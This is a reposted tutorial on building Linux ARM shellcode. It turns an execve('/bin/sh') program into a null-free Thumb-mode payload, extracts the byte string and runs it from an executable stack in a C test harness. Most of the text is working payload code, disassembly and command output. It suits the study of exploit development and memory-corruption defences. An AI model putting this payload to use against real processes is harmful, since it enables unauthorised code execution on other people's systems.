> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [jumpnowtek.com](https://jumpnowtek.com/shellcode/linux-arm-shellcode-part2.html)

Using the shell.s example from Part 1

```
.text
.global _start

_start:
    adr r0, _string
    mov r1, #0
    mov r2, #0
    mov r7, #11
    svc #1

_string:
.asciz  "/bin/sh"


```

After compiling

The object code looked like this

```
$ objdump -d shell.o

shell.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e28f000c        add     r0, pc, #12
   4:   e3a01000        mov     r1, #0
   8:   e3a02000        mov     r2, #0
   c:   e3a0700b        mov     r7, #11
  10:   ef000001        svc     0x00000001

00000014 <_string>:
  14:   6e69622f        .word   0x6e69622f
  18:   0068732f        .word   0x0068732f


```

The machine instructions, our “shellcode”, are the 32 bit values in the second column.

```
e28f000c
e3a01000
e3a02000
e3a0700b
ef000001
6e69622f
0068732f


```

We can use another GNU utility [objcopy(1)](http://man7.org/linux/man-pages/man1/objcopy.1.html) to extract just these instructions.

```
# objcopy -O binary shell.o shell.bin


```

And with [hexdump(1)](http://man7.org/linux/man-pages/man1/hexdump.1.html) look at the file

```
# hexdump -C shell.bin
00000000  0c 00 8f e2 00 10 a0 e3  00 20 a0 e3 0b 70 a0 e3  |......... ...p..|
00000010  01 00 00 ef 2f 62 69 6e  2f 73 68 00              |..../bin/sh.|
0000001c


```

Because of the way we will be inserting our code into a running process, the **0x00** bytes are going to cause problems.

### Replacing Mov Zero instructions

There are some simple alternatives to loading a zero value into a register that don’t look like this

We could subtract a register from itself

or we could XOR a register with itself

Either of those instructions end up leaving zero in **rN** which is all we want.

So now are assembly **shell.s** looks like this

```
.text
.global _start

_start:
    adr r0, _string
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #1

_string:
.asciz  "/bin/sh"


```

And the machine code like this

```
$ as shell.s -o shell.o
$ objdump -d shell.o

shell.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e28f000c        add     r0, pc, #12
   4:   e0211001        eor     r1, r1, r1
   8:   e0222002        eor     r2, r2, r2
   c:   e3a0700b        mov     r7, #11
  10:   ef000001        svc     0x00000001

00000014 <_string>:
  14:   6e69622f        .word   0x6e69622f
  18:   0068732f        .word   0x0068732f


```

We got rid of a few **0x00**’s, but still have some in these instructions e2 8f **00** 0c and ef **00** **00** 01 and the NULL terminator at the end of our string.

### Thumb Mode

In **thumb** mode, instructions are only 16 bits instead of 32 bits.

Let’s see what that does to the generated machine code.

In order to switch the processor into thumb mode we need to branch to a memory address where the lowest bit is set to 1.

Some explanation.

In normal arm mode, instructions are 32-bit and 4-byte aligned, meaning the lower two bits are always zero.

In thumb mode, instructions are 16-bit and 2-byte aligned, meaning the lowest bit is always zero.

In either mode, the processor never needs to look at the lowest bit of an address for the actual branch location.

The arm instruction set chooses to use this lowest bit of a branch address as a flag to switch between 32-bit and 16-bit processor modes. If the lowest bit is set, the processor switches to thumb mode. If the lowest bit is clear, the processor switches to normal arm mode.

The branch instruction has this form

So what should we put in **rN** since we have no idea where in memory our shellcode is going to be running?

Again we use the **pc** register to do some offset addressing.

Consider this set of instructions

```
add r1, pc, #1    @ add 1 to pc and store in r1
bx r1             @ branch to r1
<instruction 3>
<instruction 4>
...


```

Because **pc** is always two instructions ahead when we are at the execution stage, when we load **r1** with **pc** it will have the address of **<instruction 3>**. Adding 1 to this address we will set the lowest bit.

Now when we execute **bx r1**, the cpu branches to **<instruction 3>** which is just the next instruction and what we would have executed anyway, but now we will be running in thumb mode.

We also have to tell the compiler to generate 16 bit thumb code instead of the default 32 bit arm code. This is done with the **.code 16** or **.thumb** directive. By default we start in 32 bit arm code, but we can explicitly tell the compiler with a **.code 32** statement if we need to.

```
.text
.global _start

_start:
    add r1, pc, #1
    bx r1

.code 16
    adr r0, _string
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #1
 
_string:
.asciz  "/bin/sh"


```

Let’s try it.

```
$ as shell.s -o shell.o
shell.s: Assembler messages:
shell.s:9: Error: invalid immediate for address calculation (value = 0x00000006)


```

This error results from the fact that when we are in **thumb** mode the **add rN, pc, #immediate** has more restrictions then when in normal **arm** mode. The **adr r0, _string** got translated into **add r0, #6”.

I don’t have an a online reference, but the “ARM System Developer’s Guide” book, section 4.4 shows that the #immediate value has to be of the form (#immediate « 2) or a multiple of 4 when we are using the **pc** register.

```
ADD: add two 32-bit values

Rd = Rn + immediate
Rd = Rd + immediate
Rd = Rd + Rm
Rd = (pc & 0xfffffffc) + (immediate << 2)
Rd = sp + (immediate << 2)
sp = sp + (immediate << 2)


```

Our string currently starts at address **0x12 == 18** which is not 4 byte aligned. To be 4 byte aligned addresses will need to end in **0x0**, **0x4**, **0x8** or **0xc**.

What we can do is add a **NOP** to push the start address of the string down 2 bytes. Then the offset from **pc** will be #8 bytes instead of #6.

```
.text
.global _start

_start:
add r1, pc, #1
bx r1

.code 16
add r0, pc, #8
eor r1, r1, r1
eor r2, r2, r2
mov r7, #11
svc #1
nop

_string:
.asciz  "/bin/sh"


$ as shell.s -o shell.o
$ objdump -d shell.o

shell.o:     file format elf32-littlearm


Disassembly of section .text:

00000000 <_start>:
   0:   e28f1001        add     r1, pc, #1
   4:   e12fff11        bx      r1
   8:   a002            add     r0, pc, #8      ; (adr r0, 14 <_string>)
   a:   4049            eors    r1, r1
   c:   4052            eors    r2, r2
   e:   270b            movs    r7, #11
  10:   df01            svc     1
  12:   46c0            nop                     ; (mov r8, r8)

00000014 <_string>:
  14:   6e69622f        .word   0x6e69622f
  18:   0068732f        .word   0x0068732f


$ ld shell.o -o shell
$ ./shell
bash -4.4#


```

And the program runs again.

### Null Terminating a String

Looking at the shellcode, we have eliminated all of the **0x00**’s except for the final terminating NULL on our “/bin/sh” string.

```
$ objcopy -O binary shell.o shell.bin
$ hexdump -C shell.bin
00000000  01 10 8f e2 11 ff 2f e1  02 a0 49 40 52 40 0b 27  |....../...I@R@.'|
00000010  01 df c0 46 2f 62 69 6e  2f 73 68 00              |...F/bin/sh.|
0000001c


```

I have been using the gnu assembler **.asciz** directive to declare strings. This automatically appends a null byte to the string data.

There is another directive, **.ascii** which does not append the NULL.

We need the NULL though because the **execve** syscall requires a properly terminated string.

We can put a placeholder for the NULL, by declaring the string like this

And then replace the ‘A’ with **0x00** at runtime, but without adding a **0x00** to the code.

There is a variant of the store instruction **str** that will let us save one-byte to memory, **strb**.

If we take advantage of the fact that we have already set register **r1** to zero and that **r0** holds the start address of the string, we can add this instruction to copy over the ‘A’ with a **0x00** from **r1**.

Since we added an instruction, we can now remove the **nop**.

The code now looks like this

```
.text
.global _start

_start:
	add r1, pc, #1
	bx r1

.code 16
	adr r0, _string 
	eor r1, r1, r1
	eor r2, r2, r2
	strb r1, [r0, #7]
	mov r7, #11
	svc #1

_string:
.ascii  "/bin/shA"


```

Build and run

```
$ as shell.s -o shell.o
$ ld shell.o -o shell
$ ./shell
Segmentation fault


```

This issue is not directly the fault of our code, but comes from a system protection mechanism that prevents executable sections of memory (**.text**) from being writable.

Our code won’t normally be running from the **.text** section, so this next part is only for testing.

### Marking Executable Code Segments as Writable

The utility [readelf(1)](http://www.man7.org/linux/man-pages/man1/readelf.1.html) will let you look at the different sections of the executable

```
$ readelf -l shell

Elf file type is EXEC (Executable file)
Entry point 0x10054
There is 1 program header, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x00010000 0x00010000 0x00070 0x00070 R E 0x10000

 Section to Segment mapping:
  Segment Sections...
   00     .text


```

The portion of interest is the Flags ‘R E’.

Write protection to the code section of a program is a security feature and normal programs want this enabled.

The linker [ld(1)](http://man7.org/linux/man-pages/man1/ld.1.html) is responsible for marking the permissions.

There are real applications like just-in-time compilers that need this feature disabled and so there is an **ld** switch to do this.

```
$ ld --help | grep magic
  -n, --nmagic                Do not page align data
  -N, --omagic                Do not page align data, do not make text readonly
  --no-omagic                 Page align data, make text readonly
  -qmagic                     Ignored for Linux compatibility


```

If we link our code with the **-N** option and then look at the **readelf** dump

```
$ ld -N shell.o -o shell

$ readelf -l shell

Elf file type is EXEC (Executable file)
Entry point 0x10054
There is 1 program header, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000054 0x00010054 0x00010054 0x0001c 0x0001c RWE 0x4

 Section to Segment mapping:
  Segment Sections...
   00     .text


```

We can see the Flags are now ‘RWE’.

And if we run the program

```
$ ./shell
bash-4.4# exit
exit


```

Now dump the shellcode and check for 0x00’s

```
# objcopy -O binary shell.o shell.bin
# hexdump -C shell.bin 

00000000  01 10 8f e2 11 ff 2f e1  02 a0 49 40 52 40 c1 71  |....../...I@R@.q|
00000010  0b 27 01 df 2f 62 69 6e  2f 73 68 41              |.'../bin/shA|
0000001c


```

We can use [hexdump(1)](http://man7.org/linux/man-pages/man1/hexdump.1.html) to extract out the bytes into a usable format.

```
$ hexdump -v -e '"\\\x" 1/1 "%02x"' shell.bin ; echo
\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc1\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41


```

And now we can try running our code from the stack of a normal program

```
#include <stdio.h>
#include <string.h>

char *shellcode =
    "\x01\x10\x8f\xe2\x11\xff\x2f\xe1"
    "\x02\xa0\x49\x40\x52\x40\xc1\x71"
    "\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
    "\x2f\x73\x68\x41";


int main(int argc, char **argv)
{
	char buff[40];

	strcpy(buff, shellcode);

	printf("Length: %d\n", strlen(buff));

	(*(void(*)()) buff)();

	return 0;
}


```

When building we need to tell the linker to allow an executable stack [execstack(8)](http://man7.org/linux/man-pages/man8/execstack.8.html)

```
$ gcc shelltest.c -o shelltest -z execstack	


```

And run

```
# ./shelltest
Length: 28
bash-4.4#


```